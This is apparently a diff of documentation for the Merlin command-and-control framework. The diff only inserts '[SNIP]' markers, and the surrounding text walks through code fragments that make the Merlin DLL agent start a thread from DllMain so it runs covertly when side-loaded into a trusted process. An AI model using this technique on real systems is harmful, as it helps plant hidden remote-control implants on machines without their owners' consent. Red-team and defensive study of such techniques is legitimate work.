@@ -73,6 +73,8 @@ In the ``merlin-agent-dll`` repo, add a new exported function with an arbitrary 
 
 .. code-block:: go
     
+    ...[SNIP]...
+    
     // EXPORTED FUNCTIONS
 
     // MagicMan is a test function
@@ -82,11 +84,15 @@ In the ``merlin-agent-dll`` repo, add a new exported function with an arbitrary 
         run(url)
     }
 
+    ...[SNIP]...
+
 Note that the name of the exported function must match in the comment block and the code itself or Go will complain during compilation.
 
 Now, in the ``merlin.c`` source code, add a new function that executes the exported function from ``main.go``:
 
 .. code-block:: c
+    
+    ...[SNIP]...
     
     DWORD WINAPI RunMagicMan(LPVOID LpParam){
         //MessageBoxA( NULL, "Hello from MagicMan() in Merlin", "DLL Load", MB_OK );
@@ -94,9 +100,13 @@ Now, in the ``merlin.c`` source code, add a new function that executes the expor
         return TRUE;
     }
 
+    ...[SNIP]...
+
 Next, edit the structure of ``DllMain`` entry point. We want to create a thread that will execute the Merlin agent function when the DLL is side-loaded into the process:
 
 .. code-block:: c
+    
+    ...[SNIP]...
     
     BOOL WINAPI DllMain(
         HINSTANCE hinstDLL,  // handle to DLL module
@@ -111,6 +121,8 @@ Next, edit the structure of ``DllMain`` entry point. We want to create a thread 
                 CreateThread(NULL, 0, RunMagicMan, NULL, 0, 0);
                 break;
 
+    ...[SNIP]...
+    
 Now, when the Merlin DLL Agent is loaded by a trusted process, the DLL entry point will run the CreateThread function and execute the agent.
 
 Build the DLL agent with the merlin-agent-dll makefile and supply your desired URL, PSK, and protocol parameters:
